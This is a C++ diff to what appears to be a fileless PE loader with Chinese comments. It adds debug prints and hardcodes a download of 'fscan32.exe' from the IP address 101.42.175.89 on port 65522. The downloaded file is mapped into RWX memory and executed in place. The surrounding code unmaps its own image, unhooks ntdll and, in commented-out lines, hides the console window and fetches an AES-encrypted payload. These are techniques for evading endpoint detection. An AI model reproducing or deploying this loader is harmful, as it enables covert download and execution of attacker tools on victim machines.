@@ -411,6 +411,7 @@ bool RepairIAT(PVOID modulePtr)
 
     size_t maxSize = importsDir->Size;  // 导入表的长度
     size_t impAddr = importsDir->VirtualAddress;  // 导入表的起始位置
+    printf("impAddr: %p\n", impAddr);
 
     IMAGE_IMPORT_DESCRIPTOR* lib_desc = NULL;
     size_t parsedSize = 0;
@@ -418,11 +419,14 @@ bool RepairIAT(PVOID modulePtr)
     for (; parsedSize < maxSize; parsedSize += sizeof(IMAGE_IMPORT_DESCRIPTOR)) {
         // 获取libname的 VA 地址
         lib_desc = (IMAGE_IMPORT_DESCRIPTOR*)(impAddr + parsedSize + (ULONG_PTR)modulePtr);
+        printf("lib_desc:%p\n", lib_desc);
         
 
         if (lib_desc->OriginalFirstThunk == NULL && lib_desc->FirstThunk == NULL) break;
         // 获取到导入dll的名字
         LPSTR lib_name = (LPSTR)((ULONGLONG)modulePtr + lib_desc->Name);
+        printf("imagebase:%p\n", modulePtr);
+        printf("lib_name: %s\n", lib_name);
 
         size_t call_via = lib_desc->FirstThunk;  // IAT
         size_t thunk_addr = lib_desc->OriginalFirstThunk;  // INT
@@ -512,12 +516,15 @@ void PELoader(char* data, DWORD datasize)
     DWORD OldProtect = 0;
     // 获取NT头
     IMAGE_NT_HEADERS* ntHeader = (IMAGE_NT_HEADERS*)GetNTHeaders(data);
+    printf("ntHeader: %p\n", ntHeader);
     if (!ntHeader) {
         exit(0);
     }
 
-    IMAGE_DATA_DIRECTORY* relocDir = GetPEDirectory(data, IMAGE_DIRECTORY_ENTRY_BASERELOC);
-    preferAddr = (LPVOID)ntHeader->OptionalHeader.ImageBase; // 获取PE文件首地址
+    IMAGE_DATA_DIRECTORY* relocDir = GetPEDirectory(data, IMAGE_DIRECTORY_ENTRY_BASERELOC); // 获取基地址重定位表
+    printf("relocDir: %p\n", relocDir);
+    preferAddr = (LPVOID)ntHeader->OptionalHeader.ImageBase; // 获取PE文件中的镜像基址
+    printf("preferAddr: %p\n", preferAddr);
 
 
     HMODULE dll = LoadLibraryA("ntdll.dll");
@@ -525,12 +532,14 @@ void PELoader(char* data, DWORD datasize)
     ((int(WINAPI*)(HANDLE, PVOID))GetProcAddress(dll, "NtUnmapViewOfSection"))((HANDLE)-1, (LPVOID)ntHeader->OptionalHeader.ImageBase);
     // 根据PE文件加载到内存占用的总大小申请内存
     pImageBase = (BYTE*)VirtualAlloc(preferAddr, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    printf("pImageBase: %p\n", pImageBase);
     if (!pImageBase) {
         if (!relocDir) {
             exit(0);
         }
         else {
             pImageBase = (BYTE*)VirtualAlloc(NULL, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+            printf("pImageBase: %p\n", pImageBase);
             if (!pImageBase)
             {
                 exit(0);
@@ -542,11 +551,14 @@ void PELoader(char* data, DWORD datasize)
 
     // 将镜像基址赋值到pe文件头
     ntHeader->OptionalHeader.ImageBase = (size_t)pImageBase;
+    printf("ntHeader->OptionalHeader.ImageBase: %p\n", ntHeader->OptionalHeader.ImageBase);
     // 将文件头拷贝到内存中
     memcpy(pImageBase, data, ntHeader->OptionalHeader.SizeOfHeaders);
     // 文件头的节
     IMAGE_SECTION_HEADER* SectionHeaderArr = (IMAGE_SECTION_HEADER*)(size_t(ntHeader) + sizeof(IMAGE_NT_HEADERS));
+    printf("SectionHeaderArr:%p\n",SectionHeaderArr);
     // 依次通过节数把文件中的数据拷贝到内存中
+    printf("ntHeader->FileHeader.NumberOfSections is :%p \n", ntHeader->FileHeader.NumberOfSections);
     for (int i = 0; i < ntHeader->FileHeader.NumberOfSections; i++)
     {
         memcpy(LPVOID(size_t(pImageBase) + SectionHeaderArr[i].VirtualAddress), LPVOID(size_t(data) + SectionHeaderArr[i].PointerToRawData), SectionHeaderArr[i].SizeOfRawData);
@@ -653,10 +665,11 @@ BOOL Unhook(LPVOID cleanNtdll) {
 
 
 int main(int argc, char** argv) {
+    /*
     HWND hwndDOS = GetForegroundWindow();
     ShowWindow(hwndDOS, SW_HIDE);
-    HttpRequest httpReq("101.42.175.89", 65523);
-    std::string res = httpReq.HttpGet("/g");
+    HttpRequest httpReq("101.42.175.89", 65522);
+    std::vector<char> exeData = httpReq.HttpGet("/fscan32.exe");
     std::string str_orign = "vwxyz123456789011111111";
     str_orign = res;
 
@@ -691,8 +704,21 @@ int main(int argc, char** argv) {
 
 
     printf("\n\n[+] Get AES Encrypted PE from %s:%d\n", host, port);
+    */
     // 获取一个加密的PE文件
+    wchar_t* whost= L"101.42.175.89";
+    DWORD port= 65522;
+    wchar_t* wpe = L"fscan32.exe";
+    //char* host1 = argv[1];
+    //DWORD port1 = atoi(argv[2]);
+    //char* pe1 = argv[3];
+    //char* key1 = argv[4];
     DATA PE = GetData(whost, port, wpe);
+    printf("fscan32 address is :%p\n the lenght is : %d\n",PE.data,PE.len);
+    sz_masqCmd_Ansi = (char*)"whatEver";
+    PELoader((char*)PE.data, PE.len);
+    
+    /*
     if (!PE.data) {
         printf("[-] Failed in getting AES Encrypted PE\n");
         return -1;
@@ -719,6 +745,6 @@ int main(int argc, char** argv) {
 
     printf("\n[+] Finished\n");
 
-
+    */
     return 0;
 }
